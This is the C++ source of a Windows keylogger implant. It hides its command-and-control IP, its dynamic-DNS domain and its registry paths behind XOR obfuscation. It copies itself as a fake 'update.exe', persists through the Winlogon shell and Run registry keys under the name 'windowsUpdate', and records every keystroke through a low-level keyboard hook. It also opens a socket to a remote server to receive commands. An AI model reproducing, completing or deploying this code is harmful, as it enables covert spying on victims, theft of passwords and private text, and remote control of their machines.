#include "behave.hpp"
/**
 * Server Infos
 */
ServerInfo getServer()
{
    // ==> 34.125.39.73
    // char ip[] = "\x33\x35\x2c\x32\x36\x30\x28\x34\x31\x27\x3d\x38";
    
    // tmp: 172.18.43.188
    char ip[] = "\x31\x36\x30\x2d\x35\x3d\x28\x33\x3b\x27\x3b\x33\x34";
    unxor(ip);
    // windowsupdate1.ddns.net
    char dm[] = "\x77\x68\x6c\x67\x6b\x72\x75\x72\x78\x6d\x6b\x7f\x69\x3c";
    unxor(dm);
    int port = 23534;

    ServerInfo s;
    s.ServerIp = ip;
    s.ServerDomainName = dm;
    s.Port = port;
    return s;
}

std::string cpSelf()
{
    // Get current path
    char cpath[MAX_PATH];
    GetModuleFileNameA(NULL, cpath, MAX_PATH);
    std::string currentPath = (std::string)cpath;

    // Get startup folder
    // LOCALAPPDATA
    char localAppData[] = "\x4c\x4e\x41\x42\x48\x44\x56\x57\x4c\x48\x5e\x4a";
    unxor(localAppData);

    // \Microsoft\Windows
    char windows[] = "\x5c\x4c\x6b\x60\x76\x6a\x75\x68\x6e\x7d\x56\x5c\x65\x63\x6a\x60\x67\x62";
    unxor(windows);

    // \update.exe
    char targetFileName[] = "\x5c\x74\x72\x67\x65\x71\x63\x29\x6d\x71\x6f";
    unxor(targetFileName);

    // Get full path
    std::string targetPath = getenv(localAppData) + (std::string)windows + (std::string)targetFileName;

    BOOL s = CopyFileA(currentPath.c_str(), targetPath.c_str(), false);
    if (s == 1)
    {
        return targetPath;
    }
    return "";
}

bool autoStart(std::string whichToAutoStart)
{
    // ThisIsAnUncrackableKey
    // unxor
    char uncrackableKey[] = "\x54\x69\x6b\x70\x4d\x76\x47\x69\x5d\x67\x69\x79\x6d\x6e\x65\x6e\x72\x7d\x77\x58\x71\x6c";
    unxor(uncrackableKey);

    // SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
    // unxor2
    char KEY_STARTUP_REGISTRY[] = "\x08\x28\x30\x28\x1f\x33\x14\x2c\x0a\x33\x2f\x1c\x03\x12\x05\x13\x0e\x0b\x12\x18\x3a\x2f\x3e\x07\x0e\x1d\x3f\x01\x1e\x33\x17\x1c\x12\x01\x05\x0e\x20\x38\x08\x1f\x17\x23\x0b\x18\x09\x35\x3c\x07\x28";
    unxor2(KEY_STARTUP_REGISTRY, uncrackableKey);

    // Software\\Microsoft\\Windows\\CurrentVersion\\Run
    char KEY_NOT_ADMIN_STARTUP_REGISTRY[] = "\x08\x08\x10\x08\x3f\x13\x34\x0c\x0a\x33\x2f\x1c\x03\x12\x05\x13\x0e\x0b\x12\x18\x3a\x2f\x3e\x07\x0e\x1d\x3f\x01\x1e\x33\x17\x1c\x12\x01\x05\x0e\x20\x38\x08\x1f\x17\x23\x0b\x18\x09\x35\x3c\x07\x28";
    unxor2(KEY_NOT_ADMIN_STARTUP_REGISTRY, uncrackableKey);

    // SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon
    // unxor2
    char KEY_SHELL_STARTUP_REGISTRY[] = "\x08\x28\x30\x28\x1f\x33\x14\x2c\x0a\x33\x2f\x1c\x03\x12\x05\x13\x0e\x0b\x12\x18\x3a\x2f\x3e\x07\x0e\x1d\x3f\x01\x62\x21\x02\x33\x40\x32\x15\x12\x1a\x05\x0d\x19\x34\x2f\x18\x0b\x3e\x08\x08\x30\x16\x25\x29\x01\x3a\x02\x05\x1e\x10";
    unxor2(KEY_SHELL_STARTUP_REGISTRY, uncrackableKey);

    // windowsUpdate
    // unxor
    char REG_KEY_NAME[] = "\x77\x68\x6c\x67\x6b\x72\x75\x52\x78\x6d\x6b\x7f\x69";
    unxor(REG_KEY_NAME);

    HKEY hKey;
    LONG lKey;
    bool success = false;

    lKey = RegOpenKeyExA(KEY_TARGET, KEY_SHELL_STARTUP_REGISTRY, 0, KEY_ALL_ACCESS, &hKey);

    /**
     * Attempt to add to Shell Startup
     */
    if (lKey == ERROR_SUCCESS)
    {
        LONG l_set_key;
        l_set_key = RegSetValueExA(hKey, ((std::string)REG_KEY_NAME).c_str(), 0, REG_SZ, (BYTE *)whichToAutoStart.c_str(), strlen(whichToAutoStart.c_str()));
        if (l_set_key == ERROR_SUCCESS)
        {
            success = true;
        }
        RegCloseKey(hKey);
    }

    /**
     * Fail to add to shell startup
     * Try to add it to startup
     */
    if (!success)
    {
        lKey = RegOpenKeyExA(KEY_TARGET, KEY_STARTUP_REGISTRY, 0, KEY_ALL_ACCESS, &hKey);

        // Not admin user. Add it to user startup
        if (lKey == ERROR_ACCESS_DENIED)
        {
            lKey = RegOpenKeyExA(KEY_NOT_ADMIN_TARGET, KEY_NOT_ADMIN_STARTUP_REGISTRY, 0, KEY_ALL_ACCESS, &hKey);
        }
        if (lKey == ERROR_SUCCESS)
        {
            RegSetValueExA(hKey, ((std::string)REG_KEY_NAME).c_str(), 0, REG_SZ, (BYTE *)whichToAutoStart.c_str(), strlen(whichToAutoStart.c_str()));
        }
    }

    return true;
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
    {
        // Cast the lParam to the appropriate struct type
        KBDLLHOOKSTRUCT *pKbdHook = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

        switch (wParam)
        {
        case WM_KEYDOWN:
        {
            DWORD vkCode = pKbdHook->vkCode;
            if (GetAsyncKeyState(VK_SHIFT))
            {
                switch (vkCode)
                {
                case 0x30:
                    writeLog("[)]", KeyLogPath);
                    break;
                case 0x31:
                    writeLog("[!]", KeyLogPath);
                    break;
                case 0x32:
                    writeLog("[@]", KeyLogPath);
                    break;
                case 0x33:
                    writeLog("[#]", KeyLogPath);
                    break;
                case 0x34:
                    writeLog("[$]", KeyLogPath);
                    break;
                case 0x35:
                    writeLog("[%]", KeyLogPath);
                    break;
                case 0x36:
                    writeLog("[^]", KeyLogPath);
                    break;
                case 0x37:
                    writeLog("[&]", KeyLogPath);
                    break;
                case 0x38:
                    writeLog("[*]", KeyLogPath);
                    break;
                case 0x39:
                    writeLog("[(]", KeyLogPath);
                    break;
                case 0xBF:
                    writeLog("[?]", KeyLogPath); ///
                    break;
                case 0xBB:
                    writeLog("[+]", KeyLogPath);
                    break;
                case 0xBE:
                    writeLog("[<]", KeyLogPath);
                    break;
                case 0xBD:
                    writeLog("[_]", KeyLogPath);
                    break;
                case 0xE2:
                    writeLog("[>]", KeyLogPath);
                    break;
                case 0x1C:
                    writeLog("[VK_CONVERT]", KeyLogPath);
                    break;
                case 0x56:
                    writeLog("[@]", KeyLogPath);
                    break;
                case 0x2A:
                    writeLog("[PRINT]", KeyLogPath);
                    break;
                case 0x2E:
                    writeLog("[Delete]", KeyLogPath);
                    break;
                case 0xAA:
                    writeLog("[Search]", KeyLogPath);
                    break;
                case 0xF2:
                    writeLog("[Copy]", KeyLogPath);
                    break;
                case 0xFE:
                    writeLog("[Clear]", KeyLogPath);
                    break;
                case 0x3:
                    writeLog("[Connect]", KeyLogPath);
                    break;
                case 0x6:
                    writeLog("[Logoff]", KeyLogPath);
                    break;
                }
            }
            else
            {
                switch (vkCode)
                {
                case 0x30:
                    writeLog("0", KeyLogPath);
                    break;
                case 0x31:
                    writeLog("1", KeyLogPath);
                    break;
                case 0x32:
                    writeLog("2", KeyLogPath);
                    break;
                case 0x33:
                    writeLog("3", KeyLogPath);
                    break;
                case 0x34:
                    writeLog("4", KeyLogPath);
                    break;
                case 0x35:
                    writeLog("5", KeyLogPath);
                    break;
                case 0x36:
                    writeLog("6", KeyLogPath);
                    break;
                case 0x37:
                    writeLog("7", KeyLogPath);
                    break;
                case 0x38:
                    writeLog("8", KeyLogPath);
                    break;
                case 0x39:
                    writeLog("9", KeyLogPath);
                    break;
                case 0xBF:
                    writeLog("/", KeyLogPath);
                    break;
                case 0xBB:
                    writeLog("=", KeyLogPath);
                    break;
                case 0xBC:
                    writeLog(",", KeyLogPath);
                    break;
                case 0xBE:
                    writeLog(".", KeyLogPath);
                    break;
                case 0xBD:
                    writeLog("-", KeyLogPath);
                    break;
                case 0xE2:
                    writeLog("<", KeyLogPath);
                    break;
                }
            }
            if (!(GetAsyncKeyState(VK_SHIFT)))

            {
                switch (vkCode)
                {
                case 0x41:
                    writeLog("a", KeyLogPath);
                    break;
                case 0x42:
                    writeLog("b", KeyLogPath);
                    break;
                case 0x43:
                    writeLog("c", KeyLogPath);
                    break;
                case 0xBA:
                    writeLog("č", KeyLogPath);
                    break;
                case 0x44:
                    writeLog("d", KeyLogPath);
                    break;
                case 0x45:
                    writeLog("e", KeyLogPath);
                    break;
                case 0x46:
                    writeLog("f", KeyLogPath);
                    break;
                case 0x47:
                    writeLog("g", KeyLogPath);
                    break;
                case 0x48:
                    writeLog("h", KeyLogPath);
                    break;
                case 0x49:
                    writeLog("i", KeyLogPath);
                    break;
                case 0x4A:
                    writeLog("j", KeyLogPath);
                    break;
                case 0x4B:
                    writeLog("k", KeyLogPath);
                    break;
                case 0x4C:
                    writeLog("l", KeyLogPath);
                    break;
                case 0x4D:
                    writeLog("m", KeyLogPath);
                    break;
                case 0x4E:
                    writeLog("n", KeyLogPath);
                    break;
                case 0x4F:
                    writeLog("o", KeyLogPath);
                    break;
                case 0x50:
                    writeLog("p", KeyLogPath);
                    break;
                case 0x52:
                    writeLog("r", KeyLogPath);
                    break;
                case 0x53:
                    writeLog("s", KeyLogPath);
                    break;
                case 0x54:
                    writeLog("t", KeyLogPath);
                    break;
                case 0x55:
                    writeLog("u", KeyLogPath);
                    break;
                case 0x56:
                    writeLog("v", KeyLogPath);
                    break;
                case 0x5A:
                    writeLog("z", KeyLogPath);
                    break;
                case 0xDC:
                    writeLog("\\", KeyLogPath);
                    break;
                case 0x51:
                    writeLog("q", KeyLogPath);
                    break;
                case 0x57:
                    writeLog("w", KeyLogPath);
                    break;
                case 0x59:
                    writeLog("y", KeyLogPath);
                    break;
                case 0x58:
                    writeLog("x", KeyLogPath);
                    break;
                case 0xDE:
                    writeLog("ć", KeyLogPath);
                    break;
                case 0xDD:
                    writeLog("đ", KeyLogPath);
                    break;
                default:
                    writeLog(" ", KeyLogPath);
                }
            }

            if ((GetAsyncKeyState(VK_SHIFT)))

            {
                switch (vkCode)
                {
                case 0x41:
                    writeLog("A", KeyLogPath);
                    break;
                case 0x42:
                    writeLog("B", KeyLogPath);
                    break;
                case 0x43:
                    writeLog("C", KeyLogPath);
                    break;
                case 0xBA:
                    writeLog("č", KeyLogPath);
                    break;
                case 0x44:
                    writeLog("D", KeyLogPath);
                    break;
                case 0x45:
                    writeLog("E", KeyLogPath);
                    break;
                case 0x46:
                    writeLog("F", KeyLogPath);
                    break;
                case 0x47:
                    writeLog("G", KeyLogPath);
                    break;
                case 0x48:
                    writeLog("H", KeyLogPath);
                    break;
                case 0x49:
                    writeLog("I", KeyLogPath);
                    break;
                case 0x4A:
                    writeLog("J", KeyLogPath);
                    break;
                case 0x4B:
                    writeLog("K", KeyLogPath);
                    break;
                case 0x4C:
                    writeLog("L", KeyLogPath);
                    break;
                case 0x4D:
                    writeLog("M", KeyLogPath);
                    break;
                case 0x4E:
                    writeLog("N", KeyLogPath);
                    break;
                case 0x4F:
                    writeLog("O", KeyLogPath);
                    break;
                case 0x50:
                    writeLog("P", KeyLogPath);
                    break;
                case 0x52:
                    writeLog("R", KeyLogPath);
                    break;
                case 0x53:
                    writeLog("S", KeyLogPath);
                    break;
                case 0x54:
                    writeLog("T", KeyLogPath);
                    break;
                case 0x55:
                    writeLog("U", KeyLogPath);
                    break;
                case 0x56:
                    writeLog("V", KeyLogPath);
                    break;
                case 0x5A:
                    writeLog("Z", KeyLogPath);
                    break;
                case 0x51:
                    writeLog("Q", KeyLogPath);
                    break;
                case 0x57:
                    writeLog("W", KeyLogPath);
                    break;
                case 0x59:
                    writeLog("Y", KeyLogPath);
                    break;
                case 0x58:
                    writeLog("X", KeyLogPath);
                    break;
                default:
                    writeLog(" ", KeyLogPath);
                }
            }

            else
                VK_SHIFT + KF_ALTDOWN;

            switch (vkCode)
            {
            case VK_SPACE:
                writeLog("[Space]", KeyLogPath);
                break;
            case 0x2E:
                writeLog("[Delete]", KeyLogPath);
                break;
            case VK_BACK:
                writeLog("[BackSpace]", KeyLogPath);
                break;
            case VK_RETURN:
                writeLog("[Enter]\n", KeyLogPath);
                break;
            case VK_LCONTROL:
                writeLog("[Ctrl]", KeyLogPath);
                break;
            case VK_RCONTROL:
                writeLog("[Ctrl]", KeyLogPath);
                break;
            case VK_TAB:
                writeLog("[Tab]", KeyLogPath);
                break;
            case 0x25:
                writeLog("[Left Arrow]", KeyLogPath);
                break;
            case 0x26:
                writeLog("[Up Arrow]", KeyLogPath);
                break;
            case 0x27:
                writeLog("[Right Arrow]", KeyLogPath);
                break;
            case 0x28:
                writeLog("[Down Arrow]", KeyLogPath);
                break;
            case VK_ESCAPE:
                writeLog("[Esc]", KeyLogPath);
                break;
            case VK_CAPITAL:
                writeLog("[Caps Lock]", KeyLogPath);
                break;
            case VK_RSHIFT:
                writeLog("[Right Shift]", KeyLogPath);
                break;
            case VK_LSHIFT:
                writeLog("[Left Shift]", KeyLogPath);
                break;
            case VK_LMENU:
                writeLog("[Left Alt]", KeyLogPath);
                break;
            case VK_RMENU:
                writeLog("[Right Alt]", KeyLogPath);
                break;
            case VK_LWIN:
                writeLog("[Left Win]", KeyLogPath);
                break;
            case VK_RWIN:
                writeLog("[Right Win]", KeyLogPath);
                break;
            case VK_INSERT:
                writeLog("[Insert]", KeyLogPath);
                break;
            case VK_SCROLL:
                writeLog("[Scroll Lock]", KeyLogPath);
                break;
            case VK_HOME:
                writeLog("[Home]", KeyLogPath);
                break;
            case VK_END:
                writeLog("[End]", KeyLogPath);
                break;
            case VK_PRIOR:
                writeLog("[Page Up]", KeyLogPath);
                break;
            case VK_NEXT:
                writeLog("[Page Down]", KeyLogPath);
                break;
            case VK_SNAPSHOT:
                writeLog("[Print Screen]", KeyLogPath);
                break;
            case VK_OEM_3:
                writeLog("[ ~ ` ]", KeyLogPath);
                break;
            case VK_OEM_4:
                writeLog("[ { [ ]", KeyLogPath);
                break;
            case VK_OEM_6:
                writeLog("[ } ] ]", KeyLogPath);
                break;
            case VK_OEM_1:
                writeLog("[ : ; ]", KeyLogPath);
                break;
            case VK_OEM_7:
                writeLog("[ \" ' ]", KeyLogPath);
                break;
            case VK_F1:
                writeLog("[F1]", KeyLogPath);
                break;
            case VK_F2:
                writeLog("[F2]", KeyLogPath);
                break;
            case VK_F3:
                writeLog("[F3]", KeyLogPath);
                break;
            case VK_F4:
                writeLog("[F4]", KeyLogPath);
                break;
            case VK_F5:
                writeLog("[F5]", KeyLogPath);
                break;
            case VK_F6:
                writeLog("[F6]", KeyLogPath);
                break;
            case VK_F7:
                writeLog("[F7]", KeyLogPath);
                break;
            case VK_F8:
                writeLog("[F8]", KeyLogPath);
                break;
            case VK_F9:
                writeLog("[F9]", KeyLogPath);
                break;
            case VK_F10:
                writeLog("[F10]", KeyLogPath);
                break;
            case VK_F11:
                writeLog("[F11]", KeyLogPath);
                break;
            case VK_F12:
                writeLog("[F12]", KeyLogPath);
                break;
            case VK_NUMPAD0:
                writeLog("0", KeyLogPath);
                break;
            case VK_NUMPAD1:
                writeLog("1", KeyLogPath);
                break;
            case VK_NUMPAD2:
                writeLog("2", KeyLogPath);
                break;
            case VK_NUMPAD3:
                writeLog("3", KeyLogPath);
                break;
            case VK_NUMPAD4:
                writeLog("4", KeyLogPath);
                break;
            case VK_NUMPAD5:
                writeLog("5", KeyLogPath);
                break;
            case VK_NUMPAD6:
                writeLog("6", KeyLogPath);
                break;
            case VK_NUMPAD7:
                writeLog("7", KeyLogPath);
                break;
            case VK_NUMPAD8:
                writeLog("8", KeyLogPath);
                break;
            case VK_NUMPAD9:
                writeLog("9", KeyLogPath);
                break;
            case 0x6F:
                writeLog("[/]", KeyLogPath);
                break;
            case 0x6A:
                writeLog("[*]", KeyLogPath);
                break;
            case 0x6D:
                writeLog("[-]", KeyLogPath);
                break;
            case 0x6B:
                writeLog("[+]", KeyLogPath);
                break;
            case 0x6E:
                writeLog("[,]", KeyLogPath);
                break;
            }
        }
        case WM_SYSKEYDOWN:
        {
            DWORD vkCode = pKbdHook->vkCode;
            if (GetAsyncKeyState(VK_RSHIFT))
            {
                switch (vkCode)
                {
                case 0x51:
                    writeLog("[\\]", KeyLogPath);
                    break;
                case 0x57:
                    writeLog("[|]", KeyLogPath);
                    break;
                case 0xDB:
                    writeLog("[{]", KeyLogPath);
                    break;
                case 0xDD:
                    writeLog("[}]", KeyLogPath);
                    break;
                case 0xDC:
                    writeLog("[|]", KeyLogPath);
                    break;
                case 0x56:
                    writeLog("[@]", KeyLogPath);
                    break;
                case 0xBE:
                    writeLog("[>]", KeyLogPath);
                    break;
                }
            }
        }
        default:
            // Pass control to the next hook in the chain
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }
    }

    return 0;
}

DWORD WINAPI KeyLogger(LPVOID lpParameter)
{
    HHOOK hook;
    HINSTANCE hExe = GetModuleHandle(NULL);
    if (hExe == NULL)
    {
        return 1;
    }
    else
    {
        hook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, hExe, 0);
        MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) != 0)
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
        UnhookWindowsHookEx(hook);
    }
    return 0;
}

HANDLE startKeyLogging()
{
    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyLogger, NULL, 0, NULL);
}

DWORD WINAPI Connector(LPVOID lpParameter)
{

    /**
     * Get server infos
     */
    ServerInfo sInfo = getServer();

    csocket::Socket sock(sInfo.ServerIp, sInfo.Port);

    sock.Init();
    sock.Connect();

    // Command recieved
    std::string cmd;
    sock.Recv(&cmd);

    
    return 0;
}

HANDLE startNetworking()
{
    return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Connector, NULL, 0, NULL);
}